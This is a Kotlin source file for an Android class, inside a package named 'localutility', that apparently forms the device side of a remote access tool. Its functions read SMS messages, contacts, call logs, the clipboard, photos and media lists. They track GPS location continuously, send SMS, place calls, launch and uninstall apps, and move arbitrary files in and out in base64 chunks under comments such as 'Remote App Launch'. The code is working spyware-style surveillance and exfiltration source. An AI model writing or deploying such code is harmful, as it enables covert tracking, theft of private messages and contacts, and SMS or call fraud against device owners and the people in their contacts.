package com.example.localutility

import android.annotation.SuppressLint
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.RandomAccessFile

class TelephonyAndLocationManager(private val context: Context) {

    var onLocationUpdated: ((JSONObject) -> Unit)? = null
    private var locationManager: LocationManager? = null

    init {
        initLocationListener()
    }

    @SuppressLint("MissingPermission")
    private fun initLocationListener() {
        try {
            locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    val json = JSONObject().apply {
                        put("type", "LOCATION")
                        put("lat", location.latitude)
                        put("lng", location.longitude)
                        put("accuracy", location.accuracy)
                        put("timestamp", location.time)
                    }
                    onLocationUpdated?.invoke(json)
                }
                @Deprecated("Deprecated in Java")
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            if (locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) == true) {
                locationManager?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000L, 5f, listener)
            }
            if (locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) == true) {
                locationManager?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000L, 5f, listener)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    // --- Phase 1: Step 1.2 Remote App Launch & Uninstall ---
    fun launchApp(packageName: String): Boolean {
        return try {
            val launchIntent = context.packageManager.getLaunchIntentForPackage(packageName)
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(launchIntent)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    fun requestUninstallApp(packageName: String): Boolean {
        return try {
            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    // --- Target 7A: Remote Audio Tracks Discovery ---
    fun getAudioTracks(): JSONArray {
        val array = JSONArray()
        try {
            val projection = arrayOf(
                MediaStore.Audio.Media._ID,
                MediaStore.Audio.Media.TITLE,
                MediaStore.Audio.Media.ARTIST,
                MediaStore.Audio.Media.DURATION,
                MediaStore.Audio.Media.DATA,
                MediaStore.Audio.Media.SIZE,
                MediaStore.Audio.Media.DISPLAY_NAME
            )

            val selection = "${MediaStore.Audio.Media.IS_MUSIC} != 0"
            val cursor = context.contentResolver.query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                null,
                "${MediaStore.Audio.Media.TITLE} ASC"
            )

            cursor?.use {
                val titleIdx = it.getColumnIndexOrThrow(MediaStore.Audio.Media.TITLE)
                val artistIdx = it.getColumnIndexOrThrow(MediaStore.Audio.Media.ARTIST)
                val durationIdx = it.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION)
                val dataIdx = it.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA)
                val sizeIdx = it.getColumnIndexOrThrow(MediaStore.Audio.Media.SIZE)
                val nameIdx = it.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME)

                var count = 0
                while (it.moveToNext() && count < 200) {
                    val path = it.getString(dataIdx)
                    if (path != null && File(path).exists()) {
                        val durationMs = it.getLong(durationIdx)
                        val minutes = (durationMs / 1000) / 60
                        val seconds = (durationMs / 1000) % 60
                        val durationFormatted = String.format("%02d:%02d", minutes, seconds)

                        val track = JSONObject().apply {
                            put("title", it.getString(titleIdx) ?: "Unknown Title")
                            put("artist", it.getString(artistIdx) ?: "Unknown Artist")
                            put("duration", durationFormatted)
                            put("path", path)
                            put("size", it.getLong(sizeIdx))
                            put("fileName", it.getString(nameIdx) ?: File(path).name)
                        }
                        array.put(track)
                        count++
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return array
    }

    // --- Target 7B: Remote Video Tracks Discovery ---
    fun getVideoTracks(): JSONArray {
        val array = JSONArray()
        try {
            val projection = arrayOf(
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.TITLE,
                MediaStore.Video.Media.DURATION,
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DISPLAY_NAME
            )

            val cursor = context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Video.Media.DATE_MODIFIED} DESC"
            )

            cursor?.use {
                val titleIdx = it.getColumnIndexOrThrow(MediaStore.Video.Media.TITLE)
                val durationIdx = it.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION)
                val dataIdx = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
                val sizeIdx = it.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
                val nameIdx = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)

                var count = 0
                while (it.moveToNext() && count < 100) {
                    val path = it.getString(dataIdx)
                    if (path != null && File(path).exists()) {
                        val durationMs = it.getLong(durationIdx)
                        val minutes = (durationMs / 1000) / 60
                        val seconds = (durationMs / 1000) % 60
                        val durationFormatted = String.format("%02d:%02d", minutes, seconds)

                        val video = JSONObject().apply {
                            put("title", it.getString(titleIdx) ?: "Unknown Video")
                            put("duration", durationFormatted)
                            put("path", path)
                            put("size", it.getLong(sizeIdx))
                            put("fileName", it.getString(nameIdx) ?: File(path).name)
                        }
                        array.put(video)
                        count++
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return array
    }

    // --- Target 1: Chunked Download ---
    fun readFileChunk(filePath: String, offset: Long, chunkSize: Int = 48 * 1024): JSONObject {
        val json = JSONObject()
        val file = File(filePath)
        if (!file.exists() || !file.canRead()) {
            json.put("error", "File does not exist or cannot be read")
            return json
        }

        json.put("filePath", filePath)
        json.put("fileName", file.name)
        json.put("totalSize", file.length())
        json.put("offset", offset)

        RandomAccessFile(file, "r").use { raf ->
            raf.seek(offset)
            val buffer = ByteArray(chunkSize)
            val bytesRead = raf.read(buffer)
            if (bytesRead > 0) {
                val chunk = if (bytesRead < chunkSize) buffer.copyOf(bytesRead) else buffer
                json.put("data", Base64.encodeToString(chunk, Base64.NO_WRAP))
                json.put("isLast", (offset + bytesRead) >= file.length())
            } else {
                json.put("data", "")
                json.put("isLast", true)
            }
        }
        return json
    }

    // --- Target 1: Chunked Upload ---
    fun saveUploadedChunk(targetDirPath: String, fileName: String, base64Data: String, isFirst: Boolean, isLast: Boolean): Boolean {
        return try {
            val dir = if (targetDirPath.isNotEmpty()) File(targetDirPath) else Environment.getExternalStorageDirectory()
            if (!dir.exists()) dir.mkdirs()
            val file = File(dir, fileName)

            val mode = if (isFirst) "rw" else "rw"
            RandomAccessFile(file, mode).use { raf ->
                if (isFirst) {
                    raf.setLength(0)
                } else {
                    raf.seek(raf.length())
                }
                val bytes = Base64.decode(base64Data, Base64.NO_WRAP)
                raf.write(bytes)
            }
            true
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    fun getDirectoryContents(path: String?): JSONObject {
        val result = JSONObject()
        val targetDir = if (path.isNullOrEmpty()) Environment.getExternalStorageDirectory() else File(path)
        
        result.put("currentPath", targetDir.absolutePath)
        result.put("parentPath", targetDir.parent ?: targetDir.absolutePath)

        val filesArray = JSONArray()
        val list = targetDir.listFiles()
        if (list != null) {
            val sortedList = list.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
            for (f in sortedList) {
                val fObj = JSONObject().apply {
                    put("name", f.name)
                    put("path", f.absolutePath)
                    put("isDirectory", f.isDirectory)
                    put("size", if (f.isDirectory) 0 else f.length())
                    put("lastModified", f.lastModified())
                }
                filesArray.put(fObj)
            }
        }
        result.put("files", filesArray)
        return result
    }

    fun getRecentPhotos(): JSONArray {
        val array = JSONArray()
        try {
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.SIZE
            )
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )
            cursor?.use {
                val nameCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val dataCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val dateCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                val sizeCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)

                var count = 0
                while (it.moveToNext() && count < 60) {
                    val path = it.getString(dataCol)
                    if (path != null && File(path).exists()) {
                        val photo = JSONObject().apply {
                            put("name", it.getString(nameCol) ?: "photo.jpg")
                            put("path", path)
                            put("date", it.getLong(dateCol) * 1000)
                            put("size", it.getLong(sizeCol))
                        }
                        array.put(photo)
                        count++
                    }
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return array
    }

    @SuppressLint("MissingPermission")
    fun getLocation(): JSONObject {
        val json = JSONObject().apply { put("type", "LOCATION") }
        try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                json.put("lat", loc.latitude)
                json.put("lng", loc.longitude)
                json.put("accuracy", loc.accuracy)
                json.put("timestamp", loc.time)
            } else {
                json.put("error", "Searching GPS Satellite Signal...")
            }
        } catch (e: Exception) {
            json.put("error", e.message)
        }
        return json
    }

    fun getRecentSms(): JSONArray {
        val array = JSONArray()
        try {
            val uri = Uri.parse("content://sms")
            val cursor = context.contentResolver.query(uri, null, null, null, "date DESC LIMIT 50")
            cursor?.use {
                val addressIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val typeIdx = it.getColumnIndex("type")
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("address", if (addressIdx != -1) it.getString(addressIdx) else "Unknown")
                        put("body", if (bodyIdx != -1) it.getString(bodyIdx) else "")
                        put("type", if (typeIdx != -1 && it.getInt(typeIdx) == 1) "inbox" else "sent")
                    }
                    array.put(obj)
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
        return array
    }

    fun sendSms(to: String, message: String): Boolean {
        return try {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            smsManager.sendTextMessage(to, null, message, null, null)
            true
        } catch (e: Exception) { false }
    }

    fun getContacts(): JSONArray {
        val array = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                var count = 0
                while (it.moveToNext() && count < 200) {
                    val obj = JSONObject().apply {
                        put("name", if (nameIdx != -1) it.getString(nameIdx) else "Unknown")
                        put("number", if (numIdx != -1) it.getString(numIdx) else "")
                    }
                    array.put(obj)
                    count++
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
        return array
    }

    @SuppressLint("MissingPermission")
    fun makeCall(number: String) {
        try {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            context.startActivity(intent)
        } catch (e: Exception) { e.printStackTrace() }
    }

    fun getCallLogs(): JSONArray {
        val array = JSONArray()
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                null, null, "${CallLog.Calls.DATE} DESC LIMIT 100"
            )
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                while (it.moveToNext()) {
                    val typeStr = when (if (typeIdx != -1) it.getInt(typeIdx) else 0) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        else -> "Other"
                    }
                    val durSec = if (durIdx != -1) it.getLong(durIdx) else 0
                    val durFormatted = String.format("%02d:%02d", durSec / 60, durSec % 60)
                    val obj = JSONObject().apply {
                        put("number", if (numIdx != -1) it.getString(numIdx) else "Unknown")
                        put("name", if (nameIdx != -1 && it.getString(nameIdx) != null) it.getString(nameIdx) else "Unknown")
                        put("type", typeStr)
                        put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0)
                        put("duration", durFormatted)
                    }
                    array.put(obj)
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
        return array
    }

    fun getInstalledApps(): JSONArray {
        val array = JSONArray()
        try {
            val pm = context.packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            for (app in apps) {
                if (pm.getLaunchIntentForPackage(app.packageName) != null) {
                    val obj = JSONObject().apply {
                        put("name", pm.getApplicationLabel(app).toString())
                        put("package", app.packageName)
                        put("isSystem", (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0)
                    }
                    array.put(obj)
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
        return array
    }

    fun setClipboardText(text: String) {
        try {
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            cm.setPrimaryClip(ClipData.newPlainText("OpenDroid", text))
        } catch (e: Exception) { e.printStackTrace() }
    }

    fun getClipboardText(): String {
        return try {
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
        } catch (e: Exception) { "" }
    }

    fun getStorageStats(): JSONObject {
        val json = JSONObject()
        try {
            val stat = StatFs(Environment.getDataDirectory().path)
            val bytesAvailable = stat.blockSizeLong * stat.availableBlocksLong
            val totalBytes = stat.blockSizeLong * stat.blockCountLong
            val usedBytes = totalBytes - bytesAvailable

            val totalGB = String.format("%.1f GB", totalBytes / (1024.0 * 1024 * 1024))
            val usedGB = String.format("%.1f GB", usedBytes / (1024.0 * 1024 * 1024))
            val freeGB = String.format("%.1f GB", bytesAvailable / (1024.0 * 1024 * 1024))
            val usedPercent = ((usedBytes.toDouble() / totalBytes) * 100).toInt()

            json.put("totalGB", totalGB)
            json.put("usedGB", usedGB)
            json.put("freeGB", freeGB)
            json.put("usedPercent", usedPercent)
        } catch (e: Exception) { e.printStackTrace() }
        return json
    }
}